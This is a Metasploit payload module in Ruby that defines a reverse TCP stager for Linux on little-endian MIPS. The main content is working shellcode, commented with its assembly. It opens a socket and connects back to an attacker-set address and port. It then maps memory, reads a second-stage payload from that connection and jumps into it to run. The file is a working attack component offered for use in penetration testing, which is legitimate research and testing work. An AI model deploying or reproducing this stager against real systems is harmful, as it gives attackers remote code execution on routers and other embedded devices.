##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'


module MetasploitModule

  CachedSize = 272

  include Msf::Payload::Stager
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        =>
        [
          'juan vazquez',
          'tkmru'
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSLE,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LHOST' => [ [68, 64], 'ADDR16MSB' ],
              'LPORT' => [ 56, 'n' ],
            },
          'Payload' =>
            "\xfa\xff\x0f\x24" +  #  li t7,-6
            "\x27\x78\xe0\x01" +  #  nor   t7,t7,zero
            "\xfd\xff\xe4\x21" +  #  addi  a0,t7,-3
            "\xfd\xff\xe5\x21" +  #  addi  a1,t7,-3
            "\xff\xff\x06\x28" +  #  slti  a2,zero,-1
            "\x57\x10\x02\x24" +  #  li v0,4183
            "\x0c\x01\x01\x01" +  #  syscall  0x40404
            "\x2a\x80\x07\x00" +  #  slt   s0,zero,a3
            "\x36\x00\x00\x16" +  #  bnez  s0,0x4006bc <failed>
            "\xfc\xff\xa2\xaf" +  #  sw v0,-4(sp)
            "\xfc\xff\xa4\x8f" +  #  lw a0,-4(sp)
            "\xfd\xff\x0f\x24" +  #  li t7,-3
            "\x27\x78\xe0\x01" +  #  nor   t7,t7,zero
            "\xe2\xff\xaf\xaf" +  #  sw t7,-30(sp)
            "\x11\x5c\x0e\x34" +  #  li t6,0x5c11
            "\xe4\xff\xae\xaf" +  #  sw t6,-28(sp)
            "\x00\x01\x0e\x3c" +  #  lui   t6,0x100
            "\x7f\x00\xce\x35" +  #  ori   t6,t6,0x7f
            "\xe6\xff\xae\xaf" +  #  sw t6,-26(sp)
            "\xe2\xff\xa5\x27" +  #  addiu a1,sp,-30
            "\xef\xff\x0c\x24" +  #  li t4,-17
            "\x27\x30\x80\x01" +  #  nor   a2,t4,zero
            "\x4a\x10\x02\x24" +  #  li v0,4170
            "\x0c\x01\x01\x01" +  #  syscall  0x40404
            "\x2a\x80\x07\x00" +  #  slt   s0,zero,a3
            "\x25\x00\x00\x16" +  #  bnez  s0,0x4006bc <failed>
            "\xff\xff\x04\x24" +  #  li a0,-1
            "\x01\x10\x05\x24" +  #  li a1,4097
            "\xff\xff\xa5\x20" +  #  addi  a1,a1,-1
            "\xf8\xff\x09\x24" +  #  li t1,-8
            "\x27\x48\x20\x01" +  #  nor   t1,t1,zero
            "\x20\x30\x20\x01" +  #  add   a2,t1,zero
            "\x02\x08\x07\x24" +  #  li a3,2050
            "\xea\xff\x0b\x24" +  #  li t3,-22
            "\x27\x58\x60\x01" +  #  nor   t3,t3,zero
            "\x20\x58\xab\x03" +  #  add   t3,sp,t3
            "\xff\xff\x60\xad" +  #  sw zero,-1(t3)
            "\xfb\xff\x62\xad" +  #  sw v0,-5(t3)
            "\xfa\x0f\x02\x24" +  #  li v0,4090
            "\x0c\x01\x01\x01" +  #  syscall  0x40404
            "\x2a\x80\x07\x00" +  #  slt   s0,zero,a3
            "\x15\x00\x00\x16" +  #  bnez  s0,0x4006bc <failed>
            "\xf8\xff\xa2\xaf" +  #  sw v0,-8(sp)
            "\xfc\xff\xa4\x8f" +  #  lw a0,-4(sp)
            "\xf8\xff\xa5\x8f" +  #  lw a1,-8(sp)
            "\x01\x10\x06\x24" +  #  li a2,4097
            "\xff\xff\xc6\x20" +  #  addi  a2,a2,-1
            "\xa3\x0f\x02\x24" +  #  li v0,4003
            "\x0c\x01\x01\x01" +  #  syscall  0x40404
            "\x2a\x80\x07\x00" +  #  slt   s0,zero,a3
            "\x0c\x00\x00\x16" +  #  bnez  s0,0x4006bc <failed>
            "\xf8\xff\xa4\x8f" +  #  lw a0,-8(sp)
            "\x20\x28\x40\x00" +  #  add   a1,v0,zero
            "\xfd\xff\x09\x24" +  #  li t1,-3
            "\x27\x48\x20\x01" +  #  nor   t1,t1,zero
            "\x20\x30\x20\x01" +  #  add   a2,t1,zero
            "\x33\x10\x02\x24" +  #  li v0,4147
            "\x0c\x01\x01\x01" +  #  syscall  0x40404
            "\x2a\x80\x07\x00" +  #  slt   s0,zero,a3
            "\x03\x00\x00\x16" +  #  bnez  s0,0x4006bc <failed>
            "\xf8\xff\xb1\x8f" +  #  lw s1,-8(sp)
            "\xfc\xff\xb2\x8f" +  #  lw s2,-4(sp)
            "\x09\xf8\x20\x02" +  #  jalr  s1
            "\x01\x00\x04\x24" +  #  li a0,1
            "\xa1\x0f\x02\x24" +  #  li v0,4001
            "\x0c\x01\x01\x01" +  #  syscall  0x40404
            "\x25\x08\x20\x00" +  #  move  at,at
            "\x25\x08\x20\x00"    #  move  at,at
        }
      ))
  end
end
